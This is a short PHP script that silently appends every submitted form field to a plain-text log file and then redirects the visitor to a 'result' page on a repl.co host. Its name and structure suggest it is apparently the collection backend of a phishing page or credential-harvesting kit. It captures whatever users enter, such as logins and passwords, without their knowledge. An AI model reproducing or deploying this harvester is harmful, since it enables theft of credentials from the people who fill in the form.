<?php
header ('Location: https://secureyourself.mknc.repl.co/result.html');
$handle = fopen("log.txt", "a");
// fwrite($handle, "\n");
// fwrite($handle, "mknc");
foreach($_POST as $variable => $value) {
	fwrite($handle, $variable);
	fwrite($handle, " = ");
	fwrite($handle, $value);
	fwrite($handle, "\n");
}
fclose($handle);
exit;
?>